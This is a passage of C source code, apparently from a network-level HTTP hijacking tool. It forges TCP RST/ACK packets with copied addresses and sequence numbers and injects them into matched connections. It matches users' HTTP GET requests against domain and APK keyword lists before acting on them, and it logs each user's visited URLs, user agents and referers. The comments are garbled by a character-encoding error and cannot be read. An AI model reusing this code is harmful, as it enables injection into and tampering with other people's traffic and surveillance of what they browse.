    pIp->ttl        = 100;
    pIp->proto      = PROTO_TCP;
    pIp->src        = sip;
    pIp->dest       = dip;
    pIp->cksum      = 0;
    pIp->cksum      = cksum_ip(pIp);

    pTcp->dport     = dport;
    pTcp->sport     = sport;
    pTcp->seq       = htonl( ntohl(seq)+ dlen) ;
    pTcp->ack       = ack;
    pTcp->offset    = 0x50; 
    pTcp->code      =  TCPF_ACK|TCPF_RST ; 	//| TCPF_PSH | TCPF_FIN;	
    pTcp->window    = htons(0x1234);					
    pTcp->cksum     = 0;
    pTcp->cksum     = cksum_tcp(pIp);    


    sockaddr.sin_family = AF_INET;
    sockaddr.sin_port   = pTcp->dport;
    memcpy(&sockaddr.sin_addr, &pIp->dest, sizeof(uint32_t) );   
    if(tcfg.l2_sock)
    {
        sendlen = xmit_buffer(tcfg.l2_sock ,send_buff,tunel_len +20+20+offlen);
    }
    else
    {    
	    sendlen = sendto(xmit_sock , send_buff, tunel_len+0+20+20 , 0,(struct sockaddr *)&sockaddr, sizeof(sockaddr) );
    }
    if(g_debug) LOG_DEBUG(H,"sendto:%d\n",sendlen);

	/****************************************************************************************/


	return 1;
}
int chk_user(tUser *user)
{
    if( tcfg.user_interval )
    {
        if( g_nowtime - user->hit_time < tcfg.user_interval )
        {
        	if(g_debug) LOG_DEBUG(F,"user_interval:%u now_time:%ld last_time:%u\n",
                tcfg.user_interval ,g_nowtime, user->hit_time);   
            return 0;
        }
    }
    return 1;
}
HBefore * match_host_uri(char *host,char *get,http_elts  *elt,unsigned int src)
{
	int ipflag=0,ipret=0;
    int i=0,n=0,id=0;
    int j=0,pos,host_id;
    int nmatched;
    HBefore *befr=NULL;
    nmatched = ac_automa_match(&domain_ac,host);
    if(nmatched==0)
    {
		ipflag=1;
        nmatched = ac_automa_match(&domain_ac,elt->l3dip);
    }
    if(nmatched && apps_ac.key_nums)
    {
        str_ac( &apps_ac,get );
    	for(n=0;n< apps_ac.ret_nums;n++ )      //һ����ƥ��ɹ��Ľ������
    	{
            //��ȡƥ��ɹ���apk����id,��apkһ����host
    		id = apps_ac.ret_index[n];
            //printf("nmatched:%d %s id:%d  num:%d\n",nmatched,host,id,apps_ac.tnum[id]);
            //ͬһ��apk�ַ���,�����ж��befr
            for(i=0;i<apps_ac.tnum[id];i++)
            {
        		befr = apps_ac.tinfo[id][i];
                host_id = befr->idset.must_host;
                //printf("apk num:%d host:%s match_okstr:%s\n", apps_ac.tnum[id],host,apps_ac.keys[id] );
                if(host_id)
                {
                    for(j=0;j<domain_ac.ret_nums;j++)
                    {
                       pos = domain_ac.ac_nodes[j].ret_index;
                       if(host_id == domain_ids[pos])
                       {
							if(ipflag)
							{
								ipret = strcmp(domain_ac.ac_nodes[j].keys,elt->l3dip);
							}
							else if( host[0]>'0' && host[0]<='9' && check_ip(host) == 1 )
							{
								ipret = strcmp(domain_ac.ac_nodes[j].keys,host);
							}
                            if(ipret==0 && chck_match(befr,get,elt,src) )
                            {
								if(g_debug)
								printf("id:%d host_id:%d pos:%d get:%s  host:%s ac-str:%s ip:%s\n",
								befr->id,
								host_id ,
								pos,
								get,
								host,
								domain_ac.ac_nodes[j].keys,
								elt->l3dip
								);
                                return befr;
                            }
                       }
                    }
                }
            }
    	}
    }
    return NULL;
}
HBefore * match_noly_uri(char *host,char *get,http_elts  *elt,unsigned int src)
{
    int     i=0;
    int     n=0,pos=0;
	HBefore *befr=NULL;
    if(uris_ac.key_nums)
    {
        //ƥ��apk �ֵ�  /;/sougou/;.apk;.html
    	str_ac( &uris_ac,get );
        //printf("uri_num:%d\n",uris_ac.ret_nums);
    	for(n=0;n< uris_ac.ret_nums;n++ )      //һ����ƥ��ɹ��Ľ������
    	{
            //��ȡƥ��ɹ���key pos
    		pos = uris_ac.ret_index[n];  
            //�ַ���pos��Ӧ��befr
            for(i=0;i<uris_ac.tnum[pos];i++)
            {
        		befr = uris_ac.tinfo[pos][i];
                LOG_DEBUG(E," uri match:%s\n",befr);
                if( chck_match(befr,get,elt,src) )
                {
                    if(g_debug) printf("get:%s  %s pos:%d id:%d..\n",get,uris_ac.keys[pos],pos,befr->id);
                    return befr;
                }
            }
    	}
    }
	return NULL;
}

int http_proc(tEthpkt *pkthdr, tUser *user)
{
	http_elts  elt;
	char	  *data;
	int		  dlen;
	HAfter  *aftr=NULL;
	HBefore *befr=NULL;
    tIp     *pIp; 
    tTcp    *pTcp;
    char    logs[2048];

    pIp = pkthdr->pIp;
    pTcp = pkthdr->pTcp;
    data = pkthdr->data;
    dlen = pkthdr->dlen;

	memset(&elt,0,sizeof(http_elts));
	//ckeck most http get pkt len
	if(dlen>(FLOW_BUFFER-128) || dlen<10)
	{
		return 0;
	}
	proc_http_headr(data,dlen, &elt);
    elt.ip = pIp->src;
	get_ipv4_v2(pIp->dest,elt.l3dip);
	if(!elt.get || !elt.host || (elt.get > elt.host) )
	{
		return 0;
	}
    if( strlen(elt.host)>=HOST_LEN )
    {
        return 0;
    }
    elt.uri_len = strlen(elt.get);

    if( tcfg.log_env && dlen < 1600 )
    {
        sprintf(logs,"%s,%s,http://%s%s,%s,%s\n",
            time_format(time(NULL),NULL),
            get_ipv4(user->ip),
            elt.host,
            elt.get,
            elt.agent,
            elt.refer
            );
        file_write(tcfg.log_env,logs,strlen(logs));
        if(g_debug)
        {
            LOG_DEBUG(E,"%s\n",logs);
        }
        return 1;
    }
    
    if ( chck_hiturl(elt.host, elt.get) )
    {
        return 1;
    }
	befr = get_url(elt.host, elt.get, &elt,pIp->src );
    if( befr==NULL )
    {
        befr = match_host_uri(elt.host, elt.get, &elt,pIp->src);
    }
    if( befr==NULL )
    {
        befr = match_noly_uri(elt.host, elt.get, &elt,pIp->src);
    }
    if(g_debug)
    {
        LOG_DEBUG(E,"%s %s %p\n",elt.host, elt.get,befr);
    }
	if(befr == NULL)
	{
		return 1;
	}
    //printf("%s \n",elt.host);
    befr->visite++;
    aftr = get_after(befr);
    if( aftr == NULL )
    {
        return 1;
    }
    //���ʴ˴�����
    if(befr->idset.uri_word && get_word(befr,aftr,user,&elt)==0  )
    {
        return 1;
    }
    //ʱ����Լ��
    if( chk_user(user) ==0 )
    {
        return 1;
    }
    if( chck_inter(befr,aftr,user ,&elt ) == 0 )
    { 
        return 1;
    }
    aftr->location++;
    user->hit_time  = g_nowtime;
	if( tcfg.test_env )
	{
		return 1;
	}
    http_action(befr,aftr,pIp, pTcp,dlen ,&elt,pkthdr);
	return 1;
}



